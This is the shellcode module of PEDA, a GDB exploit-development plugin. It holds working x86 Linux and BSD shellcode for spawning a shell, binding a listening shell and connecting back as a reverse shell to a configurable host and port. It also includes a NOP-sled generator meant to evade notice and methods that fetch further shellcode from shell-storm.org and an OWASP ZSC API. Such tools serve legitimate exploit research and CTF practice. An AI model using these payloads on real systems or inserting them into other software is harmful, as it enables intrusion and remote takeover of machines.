#
#       PEDA - Python Exploit Development Assistance for GDB
#
#       Copyright (C) 2012 Long Le Dinh <longld at vnsecurity.net>
#
#       License: see LICENSE file for details
#

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

import random
import socket
import struct
import traceback
import six.moves.http_client
from six.moves import range
import sys

import config
from utils import msg, error_msg

if sys.version_info.major is 3:
    from urllib.request import urlopen
    from urllib.parse import urlencode
    pyversion = 3
else:
    from urllib import urlopen
    from urllib import urlencode
    pyversion = 2

def _make_values_bytes(dict_):
    """Make shellcode in dictionaries bytes"""
    return {k: six.b(v) for k, v in dict_.items()}


shellcode_x86_linux = _make_values_bytes({
    "exec": (
        "\x31\xc0"               # 0x00000000:     xor eax,eax
        "\x50"                   # 0x00000002:     push eax
        "\x68\x2f\x2f\x73\x68"   # 0x00000003:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000008:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000000D:     mov ebx,esp
        "\x31\xc9"               # 0x0000000F:     xor ecx,ecx
        "\x89\xca"               # 0x00000011:     mov edx,ecx
        "\x6a\x0b"               # 0x00000013:     push byte +0xb
        "\x58"                   # 0x00000015:     pop eax
        "\xcd\x80"               # 0x00000016:     int 0x80 ; execve()
    ),
    "bindport": (
        "\x31\xdb"               # 0x00000000:     xor ebx,ebx
        "\x53"                   # 0x00000002:     push ebx
        "\x43"                   # 0x00000003:     inc ebx
        "\x53"                   # 0x00000004:     push ebx
        "\x6a\x02"               # 0x00000005:     push byte +0x2
        "\x6a\x66"               # 0x00000007:     push byte +0x66
        "\x58"                   # 0x00000009:     pop eax
        "\x99"                   # 0x0000000A:     cdq
        "\x89\xe1"               # 0x0000000B:     mov ecx,esp
        "\xcd\x80"               # 0x0000000D:     int 0x80 ; socket()
        "\x96"                   # 0x0000000F:     xchg eax,esi
        "\x43"                   # 0x00000010:     inc ebx
        "\x52"                   # 0x00000011:     push edx
        "\x66\x68\x41\x42"       # 0x00000012:     push word 0x4241 ; port = 0x4142
        "\x66\x53"               # 0x00000016:     push bx
        "\x89\xe1"               # 0x00000018:     mov ecx,esp
        "\x6a\x66"               # 0x0000001A:     push byte +0x66
        "\x58"                   # 0x0000001C:     pop eax
        "\x50"                   # 0x0000001D:     push eax
        "\x51"                   # 0x0000001E:     push ecx
        "\x56"                   # 0x0000001F:     push esi
        "\x89\xe1"               # 0x00000020:     mov ecx,esp
        "\xcd\x80"               # 0x00000022:     int 0x80 ; bind()
        "\xb0\x66"               # 0x00000024:     mov al,0x66
        "\xd1\xe3"               # 0x00000026:     shl ebx,1
        "\xcd\x80"               # 0x00000028:     int 0x80 ; listen()
        "\x52"                   # 0x0000002A:     push edx
        "\x52"                   # 0x0000002B:     push edx
        "\x56"                   # 0x0000002C:     push esi
        "\x43"                   # 0x0000002D:     inc ebx
        "\x89\xe1"               # 0x0000002E:     mov ecx,esp
        "\xb0\x66"               # 0x00000030:     mov al,0x66
        "\xcd\x80"               # 0x00000032:     int 0x80 ; accept()
        "\x93"                   # 0x00000034:     xchg eax,ebx
        "\x6a\x02"               # 0x00000035:     push byte +0x2
        "\x59"                   # 0x00000037:     pop ecx
        "\xb0\x3f"               # 0x00000038:     mov al,0x3f
        "\xcd\x80"               # 0x0000003A:     int 0x80 ; dup2()
        "\x49"                   # 0x0000003C:     dec ecx
        "\x79\xf9"               # 0x0000003D:     jns 0x38
        "\xb0\x0b"               # 0x0000003F:     mov al,0xb
        "\x52"                   # 0x00000041:     push edx
        "\x68\x2f\x2f\x73\x68"   # 0x00000042:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000047:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000004C:     mov ebx,esp
        "\x52"                   # 0x0000004E:     push edx
        "\x53"                   # 0x0000004F:     push ebx
        "\x89\xe1"               # 0x00000050:     mov ecx,esp
        "\xcd\x80"               # 0x00000052:     int 0x80 ; execve()
    ),
    "connect": (
        "\x31\xdb"               # 0x00000000:     xor ebx,ebx
        "\x53"                   # 0x00000002:     push ebx
        "\x43"                   # 0x00000003:     inc ebx
        "\x53"                   # 0x00000004:     push ebx
        "\x6a\x02"               # 0x00000005:     push byte +0x2
        "\x6a\x66"               # 0x00000007:     push byte +0x66
        "\x58"                   # 0x00000009:     pop eax
        "\x89\xe1"               # 0x0000000A:     mov ecx,esp
        "\xcd\x80"               # 0x0000000C:     int 0x80 ; socket()
        "\x93"                   # 0x0000000E:     xchg eax,ebx
        "\x59"                   # 0x0000000F:     pop ecx
        "\xb0\x3f"               # 0x00000010:     mov al,0x3f
        "\xcd\x80"               # 0x00000012:     int 0x80 ; dup2()
        "\x49"                   # 0x00000014:     dec ecx
        "\x79\xf9"               # 0x00000015:     jns 0x10
        "\x5b"                   # 0x00000017:     pop ebx
        "\x5a"                   # 0x00000018:     pop edx
        "\x68\x7f\x7f\x7f\x7f"   # 0x00000019:     push dword 0x7f7f7f7f ; address = 127.127.127.127
        "\x66\x68\x41\x42"       # 0x0000001E:     push word 0x4241 ; port = 0x4142
        "\x43"                   # 0x00000022:     inc ebx
        "\x66\x53"               # 0x00000023:     push bx
        "\x89\xe1"               # 0x00000025:     mov ecx,esp
        "\xb0\x66"               # 0x00000027:     mov al,0x66
        "\x50"                   # 0x00000029:     push eax
        "\x51"                   # 0x0000002A:     push ecx
        "\x53"                   # 0x0000002B:     push ebx
        "\x89\xe1"               # 0x0000002C:     mov ecx,esp
        "\x43"                   # 0x0000002E:     inc ebx
        "\xcd\x80"               # 0x0000002F:     int 0x80 ; connect()
        "\x52"                   # 0x00000031:     push edx
        "\x68\x2f\x2f\x73\x68"   # 0x00000032:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000037:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000003C:     mov ebx,esp
        "\x52"                   # 0x0000003E:     push edx
        "\x53"                   # 0x0000003F:     push ebx
        "\x89\xe1"               # 0x00000040:     mov ecx,esp
        "\xb0\x0b"               # 0x00000042:     mov al,0xb
        "\xcd\x80"               # 0x00000044:     int 0x80 ; execve()
    )
})

shellcode_x86_bsd = _make_values_bytes({
    "exec": (
        "\x31\xc0"               # 0x00000000:     xor eax,eax
        "\x50"                   # 0x00000002:     push eax
        "\x68\x2f\x2f\x73\x68"   # 0x00000003:     push dword 0x68732f2f; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000008:     push dword 0x6e69622f; /bin
        "\x89\xe3"               # 0x0000000D:     mov ebx,esp
        "\x50"                   # 0x0000000F:     push eax
        "\x50"                   # 0x00000010:     push eax
        "\x53"                   # 0x00000011:     push ebx
        "\x50"                   # 0x00000012:     push eax
        "\x6a\x3b"               # 0x00000013:     push byte +0x3b
        "\x58"                   # 0x00000015:     pop eax
        "\xcd\x80"               # 0x00000016:     int 0x80 ; execve()
    ),
    "bindport": (
        "\x31\xc0"               # 0x00000000:     xor eax,eax
        "\x50"                   # 0x00000002:     push eax
        "\x68\xff\x02\x41\x42"   # 0x00000003:     push dword 0x424102ff ; port = x04142
        "\x89\xe7"               # 0x00000008:     mov edi,esp
        "\x50"                   # 0x0000000A:     push eax
        "\x6a\x01"               # 0x0000000B:     push byte +0x1
        "\x6a\x02"               # 0x0000000D:     push byte +0x2
        "\x6a\x10"               # 0x0000000F:     push byte +0x10
        "\xb0\x61"               # 0x00000011:     mov al,0x61
        "\xcd\x80"               # 0x00000013:     int 0x80 ; socket()
        "\x57"                   # 0x00000015:     push edi
        "\x50"                   # 0x00000016:     push eax
        "\x50"                   # 0x00000017:     push eax
        "\x6a\x68"               # 0x00000018:     push byte +0x68
        "\x58"                   # 0x0000001A:     pop eax
        "\xcd\x80"               # 0x0000001B:     int 0x80 ; bind()
        "\x89\x47\xec"           # 0x0000001D:     mov [edi-0x14],eax
        "\xb0\x6a"               # 0x00000020:     mov al,0x6a
        "\xcd\x80"               # 0x00000022:     int 0x80 ; listen()
        "\xb0\x1e"               # 0x00000024:     mov al,0x1e
        "\xcd\x80"               # 0x00000026:     int 0x80 ; accept()
        "\x50"                   # 0x00000028:     push eax
        "\x50"                   # 0x00000029:     push eax
        "\x6a\x5a"               # 0x0000002A:     push byte +0x5a
        "\x58"                   # 0x0000002C:     pop eax
        "\xcd\x80"               # 0x0000002D:     int 0x80 ; dup2()
        "\xff\x4f\xe4"           # 0x0000002F:     dec dword [edi-0x1c]
        "\x79\xf6"               # 0x00000032:     jns 0x2a
        "\x50"                   # 0x00000034:     push eax
        "\x68\x2f\x2f\x73\x68"   # 0x00000035:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x0000003A:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000003F:     mov ebx,esp
        "\x50"                   # 0x00000041:     push eax
        "\x54"                   # 0x00000042:     push esp
        "\x53"                   # 0x00000043:     push ebx
        "\x50"                   # 0x00000044:     push eax
        "\xb0\x3b"               # 0x00000045:     mov al,0x3b
        "\xcd\x80"               # 0x00000047:     int 0x80 ; execve()
    ),
    "connect": (
        "\x68\x7f\x7f\x7f\x7f"   # 0x00000000:     push dword 0x7f7f7f7f ; address = 127.127.127.127
        "\x68\xff\x02\x41\x42"   # 0x00000005:     push dword 0x424102ff ; port = 0x4142
        "\x89\xe7"               # 0x0000000A:     mov edi,esp
        "\x31\xc0"               # 0x0000000C:     xor eax,eax
        "\x50"                   # 0x0000000E:     push eax
        "\x6a\x01"               # 0x0000000F:     push byte +0x1
        "\x6a\x02"               # 0x00000011:     push byte +0x2
        "\x6a\x10"               # 0x00000013:     push byte +0x10
        "\xb0\x61"               # 0x00000015:     mov al,0x61
        "\xcd\x80"               # 0x00000017:     int 0x80 ; socket()
        "\x57"                   # 0x00000019:     push edi
        "\x50"                   # 0x0000001A:     push eax
        "\x50"                   # 0x0000001B:     push eax
        "\x6a\x62"               # 0x0000001C:     push byte +0x62
        "\x58"                   # 0x0000001E:     pop eax
        "\xcd\x80"               # 0x0000001F:     int 0x80 ; connect()
        "\x50"                   # 0x00000021:     push eax
        "\x6a\x5a"               # 0x00000022:     push byte +0x5a
        "\x58"                   # 0x00000024:     pop eax
        "\xcd\x80"               # 0x00000025:     int 0x80 ; dup2()
        "\xff\x4f\xe8"           # 0x00000027:     dec dword [edi-0x18]
        "\x79\xf6"               # 0x0000002A:     jns 0x22
        "\x68\x2f\x2f\x73\x68"   # 0x0000002C:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000031:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x00000036:     mov ebx,esp
        "\x50"                   # 0x00000038:     push eax
        "\x54"                   # 0x00000039:     push esp
        "\x53"                   # 0x0000003A:     push ebx
        "\x50"                   # 0x0000003B:     push eax
        "\xb0\x3b"               # 0x0000003C:     mov al,0x3b
        "\xcd\x80"               # 0x0000003E:     int 0x80 ; execve()
    )
})


shellcode_x86 = {"linux": shellcode_x86_linux, "bsd": shellcode_x86_bsd}

SHELLCODES = {"x86": shellcode_x86}

class Shellcode():
    """
    Simple wrapper for pre-defined shellcodes generation
    For complete and advanced shellcodes, Metasploit is recommended
    """
    def __init__(self, arch="x86", platform="linux"):
        if arch in SHELLCODES and platform in SHELLCODES[arch]:
            self.shellcodes = SHELLCODES[arch][platform].copy()
        else:
            self.shellcodes = None

    @staticmethod
    def gennop(size, NOPS=None):
        """
        genNOP is used to create an arbitrary length NOP sled using characters of your choosing.
        Perhaps you prefer \x90, perhaps you like the defaults. Given a list of NOP characters,
        genNOP will randomize and spit out something not easily recognized by the average human/rev engineer.
        Still, while you are working a vulnerability, you may prefer to specify one byte such as "A" or
        "\x90" as they are easily identified while searching memory.
        Defaults:
            # inc eax       @       \x40
            # inc ecx       A       \x41
            # inc edx       B       \x42
            # inc ebx       C       \x43
            # inc esp       D       \x44
            # inc ebp       E       \x45
            # inc esi       F       \x46
            # inc edi       G       \x47
            # dec eax       H       \x48
            # dec esx       J       \x4a
            # daa           '       \x27
            # das           /       \x2f
            # nop                   \x90
            # xor eax,eax           \x33\xc0
        source: atlasutils
        """
        DEFAULT_NOPS = "ABCFGHKIJ@'"
        if (not NOPS):
            NOPS = DEFAULT_NOPS
        sled = ""
        for i in range(size,0,-1):
            N = random.randint(0,len(NOPS)-1)
            sled += NOPS[N]
        return sled

    def shellcode(self, sctype, port=None, host=None):
        if not self.shellcodes or sctype not in self.shellcodes:
            return None

        if port is None:
            port=16706
        if host is None:
            host='127.127.127.127'

        shellcode = self.shellcodes[sctype]
        try:
            port = struct.pack(">H", port)
            addr = socket.inet_aton(host)
            shellcode = shellcode.replace(b"\x66\x68\x41\x42", b"\x66\x68" + port)
            shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02" + port)
            shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68" + addr)
            return shellcode
        except Exception as e:
            if config.Option.get("debug") == "on":
                msg("Exception: %s" %e)
                traceback.print_exc()
            return None

    """ search() and display() use the shell-storm API """
    def search(self, keyword):
        if keyword is None:
            return None
        try:
            msg("Connecting to shell-storm.org...")
            s = six.moves.http_client.HTTPConnection("shell-storm.org")

            s.request("GET", "/api/?s="+str(keyword))
            res = s.getresponse()
            read_result = res.read().decode('utf-8')
            data_l = [x for x in read_result.split('\n') if x]  # remove empty results
        except Exception as e:
            if config.Option.get("debug") == "on":
                msg("Exception: %s" %e)
                traceback.print_exc()
            error_msg("Cannot connect to shell-storm.org")
            return None

        data_dl = []
        for data in data_l:
            try:
                desc = data.split("::::")
                dico = {
                         'ScAuthor': desc[0],
                         'ScArch': desc[1],
                         'ScTitle': desc[2],
                         'ScId': desc[3],
                         'ScUrl': desc[4]
                       }
                data_dl.append(dico)
            except Exception as e:
                if config.Option.get("debug") == "on":
                    msg("Exception: %s" %e)
                    traceback.print_exc()

        return data_dl

    def display(self, shellcodeId):
        if shellcodeId is None:
            return None

        try:
            msg("Connecting to shell-storm.org...")
            s = six.moves.http_client.HTTPConnection("shell-storm.org")
        except:
            error_msg("Cannot connect to shell-storm.org")
            return None

        try:
            s.request("GET", "/shellcode/files/shellcode-"+str(shellcodeId)+".php")
            res = s.getresponse()
            data = res.read().decode('utf-8').split("<pre>")[1].split("<body>")[0]
        except:
            error_msg("Failed to download shellcode from shell-storm.org")
            return None

        data = data.replace("&quot;", "\"")
        data = data.replace("&amp;", "&")
        data = data.replace("&lt;", "<")
        data = data.replace("&gt;", ">")
        return data
    #OWASP ZSC API Z3r0D4y.Com
    def zsc(self,os,job,encode):
        try:
            msg('Connection to OWASP ZSC API api.z3r0d4y.com')
            params = urlencode({
                    'api_name': 'zsc', 
                    'os': os,
                    'job': job,
                    'encode': encode})
            shellcode = urlopen("http://api.z3r0d4y.com/index.py?%s\n"%(str(params))).read()
            if pyversion is 3:
                shellcode = str(shellcode,encoding='ascii')
            return '\n"'+shellcode.replace('\n','')+'"\n'
        except:
            error_msg("Error while connecting to api.z3r0d4y.com ...")
            return None
